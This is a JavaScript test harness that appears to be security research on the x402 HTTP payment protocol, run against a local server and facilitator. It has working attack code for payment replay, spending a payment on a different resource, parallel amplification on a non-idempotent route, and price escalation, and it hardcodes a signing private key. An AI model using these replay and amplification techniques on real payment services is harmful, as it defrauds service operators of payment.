/**
 * x402 attack harness v2 — isolates each documented weakness.
 * Uses the official client SDK so payloads are authentic.
 */
import { x402HTTPClient } from "@x402/core/http";
import { x402Client } from "@x402/core/client";
import { ExactEvmScheme } from "@x402/evm/exact/client";
import { privateKeyToAccount } from "viem/accounts";

const SERVER = process.env.SERVER || "http://127.0.0.1:4198";
const FACILITATOR = process.env.FACILITATOR || "http://127.0.0.1:4199";

const account = privateKeyToAccount("0x59c6995e998f97a5a0044966f0945389dc9e86dae88c7a8412f4603b6b78690d");
const client = new x402Client();
client.register("eip155:*", new ExactEvmScheme(account));
const httpClient = new x402HTTPClient(client);

const H = t => console.log(`\n${"─".repeat(76)}\n${t}\n${"─".repeat(76)}`);
const stats = () => fetch(`${SERVER}/stats`).then(r => r.json());
const facStats = () => fetch(`${FACILITATOR}/stats`).then(r => r.json());

async function buy(url, { method = "GET", body } = {}) {
  const init = { method, headers: {} };
  if (body) { init.headers["content-type"] = "application/json"; init.body = JSON.stringify(body); }
  const challenge = await fetch(url, init);
  const raw = await challenge.text();
  let parsed; try { parsed = JSON.parse(raw); } catch { parsed = undefined; }
  const paymentRequired = httpClient.getPaymentRequiredResponse(n => challenge.headers.get(n), parsed);
  const payload = await httpClient.createPaymentPayload(paymentRequired);
  return { challenge, paymentRequired, payload, headers: httpClient.encodePaymentSignatureHeader(payload) };
}

const out = {};

// 0 ─────────────────────────────────────────────────────────────
H("0. BASELINE — does the 402 handshake work?");
{
  const { challenge, headers, paymentRequired } = await buy(`${SERVER}/api/cheap`);
  console.log(`unpaid            -> ${challenge.status}`);
  console.log(`402 cache-control : ${challenge.headers.get("cache-control")}`);
  console.log(`402 extensions    : ${JSON.stringify(paymentRequired.extensions ?? null)}`);
  console.log(`402 resource.url  : ${JSON.stringify(paymentRequired.resource?.url ?? null)}`);
  console.log(`402 accepts[0]    : ${JSON.stringify(paymentRequired.accepts[0])}`);
  const r = await fetch(`${SERVER}/api/cheap`, { headers });
  console.log(`paid              -> ${r.status}  ${await r.text()}`);
  console.log(`200 cache-control : ${r.headers.get("cache-control")}`);
  console.log(`PAYMENT-RESPONSE  : ${r.headers.get("payment-response")?.slice(0, 60)}...`);
  out.baseline = r.status === 200;
  out.cacheControl402 = challenge.headers.get("cache-control");
  out.cacheControl200 = r.headers.get("cache-control");
  out.requirement = paymentRequired.accepts[0];
  out.resourceUrl = paymentRequired.resource?.url ?? null;
}

// 1 ─────────────────────────────────────────────────────────────
H("1. RESOURCE BINDING — fresh payment bought for /api/cheap, spent on /api/twin");
{
  const { headers } = await buy(`${SERVER}/api/cheap`);
  const before = await stats();
  const r = await fetch(`${SERVER}/api/twin`, { headers });
  const after = await stats();
  console.log(`/api/twin (identical price, different resource) -> ${r.status}`);
  console.log(`body: ${(await r.text()).slice(0, 100)}`);
  console.log(`twin handler executions: ${(after.handlerRuns.twin ?? 0) - (before.handlerRuns.twin ?? 0)}`);
  out.resourceSwapAccepted = r.status === 200;
}

// 2 ─────────────────────────────────────────────────────────────
H("2. REPLAY — one payment payload replayed 6x (sequential-ish, parallel)");
{
  const { headers } = await buy(`${SERVER}/api/cheap`);
  const before = await stats();
  const rs = await Promise.all(Array.from({ length: 6 }, () => fetch(`${SERVER}/api/cheap`, { headers })));
  const after = await stats();
  console.log(`200s: ${rs.filter(r => r.status === 200).length}   402s: ${rs.filter(r => r.status === 402).length}`);
  console.log(`paid-handler executions forced by ONE payment: ${(after.handlerRuns.cheap ?? 0) - (before.handlerRuns.cheap ?? 0)}`);
  out.replayGrants = rs.filter(r => r.status === 200).length;
  out.replayHandlerRuns = (after.handlerRuns.cheap ?? 0) - (before.handlerRuns.cheap ?? 0);
}

// 3 ─────────────────────────────────────────────────────────────
H("3. ECONOMIC AMPLIFICATION — one payment, 8 parallel calls to a 250ms non-idempotent route");
{
  const { headers } = await buy(`${SERVER}/api/expensive-sideeffect`, { method: "POST", body: { x: 1 } });
  const before = await stats();
  const t0 = Date.now();
  const rs = await Promise.all(
    Array.from({ length: 8 }, () =>
      fetch(`${SERVER}/api/expensive-sideeffect`, {
        method: "POST",
        headers: { ...headers, "content-type": "application/json" },
        body: JSON.stringify({ x: 1 }),
      })),
  );
  const after = await stats();
  console.log(`200s: ${rs.filter(r => r.status === 200).length}/8   402s: ${rs.filter(r => r.status === 402).length}`);
  console.log(`server-side paid-handler executions: ${(after.handlerRuns.sideeffect ?? 0) - (before.handlerRuns.sideeffect ?? 0)}  wall=${Date.now() - t0}ms`);
  out.amplificationRuns = (after.handlerRuns.sideeffect ?? 0) - (before.handlerRuns.sideeffect ?? 0);
  out.amplificationPaid = rs.filter(r => r.status === 200).length;
}

// 4 ─────────────────────────────────────────────────────────────
H("4. PRICE ENFORCEMENT — $0.01 payment against the $99 route");
{
  const { headers } = await buy(`${SERVER}/api/cheap`);
  const r = await fetch(`${SERVER}/api/expensive`, { headers });
  console.log(`/api/expensive with $0.01 payment -> ${r.status} (price is bound in the signature)`);
  out.priceEscalationAccepted = r.status === 200;
}

// 5 ─────────────────────────────────────────────────────────────
H("5. VERIFY/SETTLE SEPARATION — replay the same payload to the FACILITATOR /verify only");
{
  const { headers, payload } = await buy(`${SERVER}/api/cheap`);
  const b64 = Buffer.from(JSON.stringify(payload)).toString("base64");
  const body = JSON.stringify({ paymentPayload: JSON.parse(Buffer.from(b64, "base64").toString()), paymentRequirements: out.requirement });
  const vs = [];
  for (let i = 0; i < 5; i++) {
    const r = await fetch(`${FACILITATOR}/verify`, { method: "POST", headers: { "content-type": "application/json" }, body });
    vs.push((await r.json()).isValid);
  }
  console.log(`facilitator /verify results for the same payload x5: ${JSON.stringify(vs)}`);
  console.log(`=> the facilitator has no nonce/idempotency state; single-use is enforced ONLY on-chain`);
}

console.log(`\n${"=".repeat(76)}\nFINAL SUMMARY\n${"=".repeat(76)}`);
console.log(JSON.stringify(out, null, 2));
console.log(`facilitator stats: ${JSON.stringify(await facStats())}`);
